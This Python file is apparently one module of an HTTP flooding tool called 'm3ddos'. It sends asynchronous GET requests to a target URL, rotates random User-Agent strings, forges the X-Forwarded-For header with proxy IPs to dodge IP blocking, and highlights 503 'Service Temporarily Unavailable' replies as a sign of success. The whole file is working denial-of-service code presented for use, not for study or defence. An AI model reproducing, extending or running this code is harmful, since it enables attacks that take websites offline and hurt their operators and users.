import aiohttp
import random
import sys
from colorama import Fore, Back, Style

class Requests:
	def __init__(self, target_url, user_agents) -> None:
		self.user_agents = user_agents
		self.target_url = target_url

	async def send_request(self, proxy_ip):
		http_headers = {
			"User-Agent": random.choice(self.user_agents),
			"X-Forwarded-For": proxy_ip
		}
		
		torbulator = "\t"
		if len(proxy_ip) < 8:
			torbulator = torbulator * 2

		try:
			async with aiohttp.ClientSession() as session:
				async with session.get(self.target_url, headers=http_headers) as response:	
					if response.status == 503:
						response.status = f"{Fore.RED}Service Temporarily Unavailable{Fore.RESET}"

					print(f"{Fore.RED}{proxy_ip}{Fore.RESET}{torbulator}   ->    {Fore.RED}{self.target_url}{Fore.RESET}    -    {response.status}")
		except Exception as error:
			print(f"{Fore.RED}{proxy_ip}{Fore.RESET}{torbulator}   ->    {Fore.RED}{self.target_url}{Fore.RESET}    -    {Fore.YELLOW}{error}{Fore.RESET}")

if __name__ == '__main__':
        exit("Cannot execute '" + sys.argv[0] + "' without m3ddos!")
